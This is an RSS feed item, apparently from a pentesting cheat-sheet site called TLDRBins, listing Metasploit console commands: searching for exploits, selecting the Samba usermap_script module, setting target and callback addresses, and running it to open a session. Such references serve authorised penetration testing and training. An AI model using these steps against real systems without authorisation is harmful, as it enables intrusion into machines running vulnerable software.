channel.title: Meterpreter on TLDRBins
channel.description: Recent content in Meterpreter on TLDRBins

item.title: Metasploit
item.description: msfconsole meterpreter Start Msfconsole msfconsole -q General # Return to previous page back # Upgrade session sessions -u # Quit exit Search Exploit search <KEYWORD> search samba use <NUM> use 15 # Choose by full path use <MODULE_PATH> use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts <TARGET> set lhost <LOCAL_IP> set lport <LOCAL_PORT> # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter
